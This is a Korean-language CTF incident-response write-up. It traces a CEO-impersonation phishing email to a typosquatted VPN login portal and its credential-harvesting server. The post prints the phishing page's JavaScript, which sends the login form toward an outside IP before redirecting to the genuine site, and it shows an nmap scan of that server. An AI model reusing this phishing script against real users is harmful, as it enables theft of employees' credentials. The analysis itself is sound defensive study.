---
title: Raccoon City Threat Intelligence
author: heogi
date: 2025-11-23
categories:
  - CTF
  - RaccoonCity
tags:
  - CTF
  - Incident_Response
comments: true
---
### Summary
전 직원에게 CEO 명의로 복지 포털 로그인 요청 이메일이 발송되었습니다.   
CEO는 발송 사실을 부인했습니다. TI 팀은 원본 이메일 `client_request.eml`을 확보했습니다.
의심 이메일의 발송 경로와 인프라를 추적하라.

### Client_request.eml 분석
`client_request.eml` 확인 시 `ceo_forward.eml` 파일이 확인된다.
해당 메일에는 CEO로 부터 FW 된 피싱 메일인 `original_mass_email.eml` 첨부되어있다.
![|394x243](../assets/img/2025-11-23-Raccoon%20City%20Threat%20Intelligence-1763905504005.png)
피싱 메일에 첨부된 링크는 `http://vpn.racooncoin.site/` (Typosquatting) 이며 Raccoon Coin 내부 임직원들이 사용하는 VPN Web Portal로 확인된다.
![|590x369](../assets/img/2025-11-23-Raccoon%20City%20Threat%20Intelligence-1763905591944.png)

### Phising Site 분석
Phising Site 의 코드를 확인해보면 아래와 같은 수상한 Javascript가 확인된다.
해당 사이트에 사용자가 입력한 사내 이메일, 패스워드 등 을 `140.238.194.224` 서버로 전송하고 3초 뒤 원본 사이트인 `www.raccooncoin.site`로 이동시킨다.
해당 Phising Site를 통해 공격자는 Raccooncoin 임직원의 사내 계정 및 패스워드를 확보할 수 있었다.
```javascript
<script>
	document.getElementById('year').textContent = new Date().getFullYear();

    const form = document.getElementById('vpn-form');
    const submitBtn = document.getElementById('submitBtn');
    const demoBtn = document.getElementById('demoBtn');
    const result = document.getElementById('result');

    form.addEventListener('submit', (e) => {
	    e.preventDefault();
        submitBtn.disabled = true;
        submitBtn.textContent = '연결 중...';
        result.style.display = 'none';

        window.location.href = 'http://140.238.194.224';

	    setTimeout(() => {
          window.location.href = 'https://www.raccooncoin.site';
	    }, 3000);
	});
</script>
```

### Credential Harvest 서버 분석
임직원의 계정 정보를 수집하는 서버의 정보 수집을 위해 스캐닝을 진행하면 SSH, HTTP를 서비스 중인것으로 확인된다.
```shell
heogi@heogi-macbook:~$ sudo nmap -sV 140.238.194.224
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-23 23:57 KST
Nmap scan report for 140.238.194.224
Host is up (0.15s latency).
Not shown: 996 filtered tcp ports (no-response), 1 filtered tcp ports (host-prohibited)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp   open  tcpwrapped
8081/tcp open  http       SimpleHTTPServer 0.6 (Python 3.12.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.17 seconds
```
이 중 임직원 정보를 수집하기 위해 오픈되어있는 80 포트 외 8081 SimpleHTTP 서비스에 접속해보면 아래 처럼 `raccooncoin_info.zip` 파일이 확인된다.

![|225x94](../assets/img/2025-11-23-Raccoon%20City%20Threat%20Intelligence-1763912008575.png)

